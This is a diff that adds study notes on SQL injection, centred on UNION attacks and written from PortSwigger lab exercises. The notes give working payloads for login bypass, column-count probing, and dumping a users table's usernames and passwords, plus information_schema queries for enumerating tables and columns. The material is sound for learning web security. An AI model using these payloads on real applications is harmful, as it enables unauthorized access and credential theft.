@@ -1,0 +1,317 @@
+# SQL Injection (SQLi) – UNION Attack Notes
+
+## What is SQL Injection?
+
+**SQL Injection is a vulnerability that allows an attacker to manipulate SQL queries through user input and access data they are not authorized to see.**
+
+> These notes are based on authorized PortSwigger Web Security Academy labs.
+
+---
+
+## 1. Basic SQL Injection
+
+A website may execute a query such as:
+
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'
+AND released = 1;
+```
+
+A payload such as:
+
+```sql
+' OR 1=1--
+```
+
+changes the logic of the query.
+
+### Payload explanation
+
+* `'` → closes the current SQL string.
+* `OR 1=1` → creates a condition that is always `TRUE`.
+* `--` → comments out the remaining SQL.
+
+---
+
+## 2. Login Bypass
+
+A login query may look like:
+
+```sql
+SELECT * FROM users
+WHERE username = 'administrator'
+AND password = 'password';
+```
+
+In a vulnerable application, an input such as:
+
+```sql
+administrator'--
+```
+
+can make the effective condition:
+
+```sql
+WHERE username = 'administrator'
+```
+
+The password check after `--` is commented out.
+
+---
+
+# 3. UNION SQL Injection
+
+`UNION` combines the results of two `SELECT` queries.
+
+Example:
+
+```sql
+SELECT name, description FROM products
+UNION
+SELECT username, password FROM users;
+```
+
+The second query's results can appear together with the application's original results.
+
+---
+
+## 4. Determine the Number of Columns
+
+Before using a `UNION` attack, determine how many columns the original query returns.
+
+Test:
+
+```sql
+' UNION SELECT NULL--
+```
+
+If it fails:
+
+```sql
+' UNION SELECT NULL,NULL--
+```
+
+If it still fails:
+
+```sql
+' UNION SELECT NULL,NULL,NULL--
+```
+
+Continue until the query succeeds.
+
+Example:
+
+```text
+1 NULL   → Error ❌
+2 NULLs  → Error ❌
+3 NULLs  → Works ✅
+
+Therefore: 3 columns
+```
+
+### Why use NULL?
+
+`NULL` works well as a placeholder while testing column count because it is compatible with many SQL data types.
+
+---
+
+## 5. Find a Column That Can Display Text
+
+Knowing the number of columns is not always enough.
+
+If there are three columns:
+
+```sql
+UNION SELECT NULL,NULL,NULL
+```
+
+test a string in each position:
+
+```sql
+UNION SELECT 'test',NULL,NULL--
+```
+
+```sql
+UNION SELECT NULL,'test',NULL--
+```
+
+```sql
+UNION SELECT NULL,NULL,'test'--
+```
+
+If this works:
+
+```sql
+UNION SELECT NULL,'test',NULL--
+```
+
+then:
+
+```text
+Column 1 → ?
+Column 2 → TEXT compatible ✅
+Column 3 → ?
+```
+
+This is useful because textual database values such as usernames may need to be returned through a compatible column.
+
+---
+
+# 6. Retrieving Data From Another Table
+
+Suppose we know the database contains:
+
+```text
+Table: users
+
+Columns:
+- username
+- password
+```
+
+SQL to retrieve them:
+
+```sql
+SELECT username, password
+FROM users;
+```
+
+In a vulnerable two-column UNION query, the lab payload may therefore look like:
+
+```sql
+' UNION SELECT username,password FROM users--
+```
+
+### Explanation
+
+```text
+'
+→ close the original string
+
+UNION
+→ combine another query's results
+
+SELECT
+→ retrieve data
+
+username,password
+→ columns to retrieve
+
+FROM users
+→ source table
+
+--
+→ comment out the rest of the original query
+```
+
+---
+
+# 7. How Do I Discover Table Names?
+
+In many non-Oracle databases, metadata is available through:
+
+```sql
+information_schema
+```
+
+Think of it as a directory describing the database.
+
+To list table names:
+
+```sql
+SELECT table_name
+FROM information_schema.tables;
+```
+
+Possible result:
+
+```text
+products
+users
+orders
+```
+
+---
+
+# 8. How Do I Discover Column Names?
+
+After identifying an interesting table, query its column metadata.
+
+For example:
+
+```sql
+SELECT column_name
+FROM information_schema.columns
+WHERE table_name = 'users';
+```
+
+Possible result:
+
+```text
+username
+password
+email
+```
+
+Now the database structure is clearer:
+
+```text
+Database
+│
+├── products
+│
+├── orders
+│
+└── users
+    ├── username
+    ├── password
+    └── email
+```
+
+Then, in an authorized lab, the required data can be queried with the appropriate `SELECT`.
+
+---
+
+# SQLi UNION Methodology
+
+My workflow:
+
+```text
+Find SQL injection
+        ↓
+Determine number of columns
+        ↓
+Determine which columns can display text
+        ↓
+Identify the database type
+        ↓
+Discover table names
+        ↓
+Discover column names
+        ↓
+Query the required lab data
+```
+
+## Key Commands to Remember
+
+```sql
+SELECT
+FROM
+WHERE
+AND
+OR
+UNION
+NULL
+--
+```
+
+### Most Important Lesson
+
+Do not memorize SQL injection payloads without understanding them.
+
+Understand:
+
+**original query → controlled input → modified query → database response**
+
+This makes it much easier to adapt SQLi techniques to different authorized labs and applications.
